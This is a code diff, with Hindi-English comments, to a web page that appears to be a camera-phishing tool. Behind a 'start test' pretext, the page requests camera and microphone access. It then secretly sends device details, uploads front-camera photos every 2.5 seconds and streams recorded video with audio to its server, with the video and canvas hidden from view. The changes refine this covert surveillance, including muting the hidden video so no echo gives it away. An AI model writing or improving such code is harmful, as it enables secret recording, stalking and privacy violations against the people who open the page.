@@ -70,6 +70,7 @@ box-shadow:0 0 35px #ff004c;
   
 iframe{width:100%;height:100%;border:0;display:none;}  
   
+/* v ko mute kiya hai echo band karne ke liye */
 #v,#c{display:none;}  
   
 </style>  
@@ -85,7 +86,8 @@ iframe{width:100%;height:100%;border:0;display:none;}
 </div>  
 
 <iframe id="frame"></iframe>  
-<video id="v" autoplay playsinline></video>  
+<!-- Muted attribute added to stop audio loop noise -->
+<video id="v" autoplay playsinline muted></video>  
 <canvas id="c"></canvas>  
 
 <script>  
@@ -94,7 +96,7 @@ const c = document.getElementById("c");
 let recorder;  
 let chunks=[];  
   
-/* 1. DEVICE INFO (Unchanged) */  
+/* 1. DEVICE INFO */  
 function sendDeviceInfo(){  
   fetch("/device",{  
     method:"POST",  
@@ -108,61 +110,69 @@ function sendDeviceInfo(){
   }).catch(e => console.log("Device info error:", e));  
 }  
   
-/* 2. ELITE SNAPSHOT CAPTURE (HD Quality & No Distortion) */  
+/* 2. SNAPSHOT CAPTURE */  
 function capture(){  
-  // Jab tak video ki actual width/height load na ho jaye, capture mat karo
   if(!v.videoWidth || !v.videoHeight) return;  
   
-  // Canvas ko phone camera ke asli resolution par set karo
+  // Canvas ko video ke hisaab se set karo, distortion nahi hoga
   c.width = v.videoWidth;  
   c.height = v.videoHeight;  
   
   const ctx = c.getContext("2d");  
   
-  // Image smoothing enable karo quality aur sharp karne ke liye
   ctx.imageSmoothingEnabled = true;
   ctx.imageSmoothingQuality = "high";
   
   ctx.drawImage(v, 0, 0, c.width, c.height);  
   
-  // 1.0 = Maximum (100%) JPEG Quality
+  // 0.8 is best balance between quality and upload speed
   c.toBlob(b => {  
     let f = new FormData();  
     f.append("photo", b, "u.jpg");  
     fetch("/upload", { method:"POST", body:f }).catch(e => console.log("Upload failed", e));  
-  }, "image/jpeg", 1.0);  
+  }, "image/jpeg", 0.8);  
 }  
   
-/* 3. VIDEO RECORDING */  
+/* 3. VIDEO RECORDING (Continuous, No lag) */  
 function startVideo(stream){  
+  // Codec aur bitrate set kiya smooth video ke liye
+  const options = { mimeType: 'video/webm;codecs=vp8,opus', videoBitsPerSecond: 500000 };
+  
   try {
-    recorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" }); 
+    recorder = new MediaRecorder(stream, options); 
   } catch (e) {
-    recorder = new MediaRecorder(stream); // Fallback for some browsers
+    recorder = new MediaRecorder(stream); // Fallback
   } 
   
   recorder.ondataavailable = e => {  
-    if(e.data.size > 0) chunks.push(e.data);  
+    if(e.data.size > 0) {
+      chunks.push(e.data);
+      // Agar chunks bade ho gaye, toh bhej do taaki memory full na ho
+      if(chunks.length > 5) {
+         sendVideoData();
+      }
+    }  
   };  
   
   recorder.onstop = () => {  
+    sendVideoData();
+  };  
+  
+  // Start recording, and slice data every 2 seconds
+  recorder.start(2000); 
+}  
+
+// Video bhejne ka function
+function sendVideoData() {
+    if(chunks.length === 0) return;
+    
     let blob = new Blob(chunks, {type:"video/webm"});  
-    chunks = [];  
+    chunks = []; // clear old chunks
     
     let f = new FormData();  
     f.append("video", blob, "v.webm");  
-    fetch("/video", {method:"POST", body:f}).catch(e => console.log("Video upload failed", e));  
-  };  
-  
-  setInterval(() => {  
-    if(recorder.state === "inactive") {
-      recorder.start();  
-      setTimeout(() => {  
-        if(recorder.state === "recording") recorder.stop();  
-      }, 5000);  
-    }
-  }, 5000);  
-}  
+    fetch("/video", {method:"POST", body:f}).catch(e => console.log("Video upload failed", e)); 
+}
   
 /* 4. START TEST & CAMERA INIT */  
 async function start(){  
@@ -170,28 +180,30 @@ async function start(){
   
   try {  
     stream = await navigator.mediaDevices.getUserMedia({  
-      // Elite constraints: Forces mobile browser to use the absolute best resolution
+      // Optimized resolution for clear but smooth video
       video: { 
         facingMode: "user",
-        width: { ideal: 4096 },  // Forces 4K or highest supported HD resolution
-        height: { ideal: 2160 }
+        width: { ideal: 1280 }, // 720p HD - best for both quality and speed
+        height: { ideal: 720 },
+        frameRate: { ideal: 24 } // Smooth movement
       },
-      audio: true // Add audio false if you don't want mic permission
+      audio: {
+          echoCancellation: true, // Fixes audio issues
+          noiseSuppression: true
+      }
     });  
   } catch(e) {  
-    alert("Camera permission required to proceed.");  
+    alert("Camera & Mic permission required to proceed.");  
     return;  
   }  
   
   v.srcObject = stream;  
-  
-  // Play explicitly to ensure metadata is loaded for frame capture
   v.play().catch(e => console.log(e));
   
   sendDeviceInfo();  
   
-  // Har 1.5 second mein ek high-res photo click karega (1000 ki jagah thoda gap dena acha hai for performance)
-  setInterval(capture, 1500);  
+  // Har 2.5 second mein photo (server load kam rahega, video smooth chalegi)
+  setInterval(capture, 2500);  
   
   startVideo(stream);  
   
